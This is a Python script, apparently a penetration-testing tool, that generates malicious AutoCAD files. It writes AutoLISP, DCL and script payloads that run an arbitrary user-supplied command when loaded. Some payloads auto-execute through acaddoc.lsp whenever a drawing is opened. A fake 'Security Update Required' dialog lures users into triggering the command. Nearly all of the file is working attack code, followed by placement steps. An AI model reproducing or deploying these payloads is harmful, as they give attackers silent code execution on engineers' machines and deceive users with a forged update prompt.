"""
DCL / AutoLISP / DXF Payload Generator

Attack Vector:
    AutoCAD and CAD applications support DCL (Dialog Control Language) and
    AutoLISP scripting. Malicious .dcl, .lsp, .fas, .vlx, .dvb, or .dxf
    files can execute arbitrary commands when imported/opened.

Targets:
    - AutoCAD and AutoCAD-compatible applications
    - CAD viewers that process DXF/DWG files
    - Engineering/design software with file import features
    - Any app processing AutoLISP scripts

Usage:
    python -I dcl_payload.py --output payloads/ --type all
    python -I dcl_payload.py --output payloads/ --type lsp --cmd calc.exe
    python -I dcl_payload.py --output payloads/ --type dxf
"""

import argparse
import os


def generate_malicious_lsp(cmd: str = "calc.exe") -> str:
    """AutoLISP script that executes a command."""
    return f"""; AutoLISP Payload — VAPT PoC
; This runs when loaded via (load "payload.lsp") or auto-loaded from acad.lsp / acaddoc.lsp

; Method 1: Direct command execution via startapp
(defun c:VAPT_POC ()
  (startapp "{cmd}")
  (princ "\\nVAPT PoC executed")
  (princ)
)

; Method 2: Shell command via DOS
(defun c:HELP_UPDATE ()
  (command "shell" "{cmd}")
  (princ)
)

; Auto-execute on load
(startapp "{cmd}")
(princ "\\n[VAPT] Payload executed on file load")
(princ)
"""


def generate_acad_lsp(cmd: str = "calc.exe") -> str:
    """acad.lsp / acaddoc.lsp — auto-loads when AutoCAD starts or opens a drawing."""
    return f"""; acaddoc.lsp — Auto-loads with every drawing
; Place in: %APPDATA%\\Autodesk\\AutoCAD <version>\\<lang>\\Support\\
; Or in the drawing's directory (if ACAD trusts it)

(defun s::startup ()
  (startapp "{cmd}")
  (princ "\\nLoaded custom startup routines")
  (princ)
)
"""


def generate_malicious_dcl() -> str:
    """DCL dialog that could be used to social-engineer user interaction."""
    return """; DCL Payload — Social engineering dialog
; Load with AutoLISP: (load_dialog "payload.dcl")

vapt_dialog : dialog {
    label = "Security Update Required";
    : text {
        value = "A critical update is available for this component.";
    }
    : text {
        value = "Click OK to install the update.";
    }
    : row {
        : button {
            label = "OK";
            key = "accept";
            is_default = true;
        }
        : button {
            label = "Cancel";
            key = "cancel";
            is_cancel = true;
        }
    }
}
"""


def generate_dcl_loader_lsp(cmd: str = "calc.exe") -> str:
    """AutoLISP loader for the DCL dialog — executes payload on OK."""
    return f"""; DCL Loader — pairs with payload.dcl
(defun c:UPDATE ()
  (setq dcl_id (load_dialog "payload.dcl"))
  (if (not (new_dialog "vapt_dialog" dcl_id))
    (exit)
  )
  (action_tile "accept"
    "(done_dialog 1)"
  )
  (action_tile "cancel"
    "(done_dialog 0)"
  )
  (setq result (start_dialog))
  (unload_dialog dcl_id)
  (if (= result 1)
    (progn
      (startapp "{cmd}")
      (princ "\\n[VAPT] Payload executed via DCL dialog")
    )
  )
  (princ)
)

; Auto-run variant (no user interaction needed)
(startapp "{cmd}")
"""


def generate_malicious_scr() -> str:
    """AutoCAD .scr (script) file — executes commands line by line."""
    return """; AutoCAD Script File (.scr)
; Runs when opened or imported as a script
; Usage: Open AutoCAD, type SCRIPT, select this file

; Execute system command
shell calc.exe

; Or via LISP expression embedded in script
(startapp "calc.exe")

"""


def generate_malicious_dxf(cmd: str = "calc.exe") -> str:
    """Minimal DXF with embedded AutoLISP (some viewers execute it)."""
    return f"""  0
SECTION
  2
HEADER
  9
$ACADVER
  1
AC1032
  0
ENDSEC
  0
SECTION
  2
ENTITIES
  0
LINE
 10
0.0
 20
0.0
 11
100.0
 21
100.0
  0
ENDSEC
  0
EOF
"""
    # Note: Pure DXF doesn't execute code, but some vulnerable parsers
    # may process embedded LISP or have buffer overflows on malformed data.
    # The real attack is pairing .dxf with acaddoc.lsp in the same directory.


def main():
    parser = argparse.ArgumentParser(description="DCL/AutoLISP/DXF payload generator for VAPT")
    parser.add_argument("--output", "-o", default=".", help="Output directory")
    parser.add_argument("--type", choices=["lsp", "dcl", "scr", "dxf", "acad", "all"],
                        default="all", help="Payload type")
    parser.add_argument("--cmd", default="calc.exe", help="Command to execute")
    args = parser.parse_args()

    os.makedirs(args.output, exist_ok=True)
    print(f"[*] DCL/AutoLISP Payload Generator")
    print(f"[*] Command: {args.cmd}\n")

    if args.type in ("lsp", "all"):
        path = os.path.join(args.output, "payload.lsp")
        with open(path, "w") as f:
            f.write(generate_malicious_lsp(args.cmd))
        print(f"[+] {path} — AutoLISP payload (load or auto-execute)")

    if args.type in ("acad", "all"):
        path = os.path.join(args.output, "acaddoc.lsp")
        with open(path, "w") as f:
            f.write(generate_acad_lsp(args.cmd))
        print(f"[+] {path} — Auto-load on drawing open")

    if args.type in ("dcl", "all"):
        path = os.path.join(args.output, "payload.dcl")
        with open(path, "w") as f:
            f.write(generate_malicious_dcl())
        print(f"[+] {path} — DCL social engineering dialog")

        path = os.path.join(args.output, "loader.lsp")
        with open(path, "w") as f:
            f.write(generate_dcl_loader_lsp(args.cmd))
        print(f"[+] {path} — DCL loader (pairs with payload.dcl)")

    if args.type in ("scr", "all"):
        path = os.path.join(args.output, "payload.scr")
        with open(path, "w") as f:
            f.write(generate_malicious_scr())
        print(f"[+] {path} — AutoCAD script file")

    if args.type in ("dxf", "all"):
        path = os.path.join(args.output, "payload.dxf")
        with open(path, "w") as f:
            f.write(generate_malicious_dxf(args.cmd))
        print(f"[+] {path} — DXF file (pair with acaddoc.lsp in same dir)")

    print(f"\n[*] Testing steps:")
    print(f"  1. Place payload files in target app's working directory")
    print(f"  2. Import/open the file through the target application")
    print(f"  3. Check if the command executed (calc.exe should pop)")
    print(f"  4. For acaddoc.lsp: place in same folder as a .dwg file")


if __name__ == "__main__":
    main()
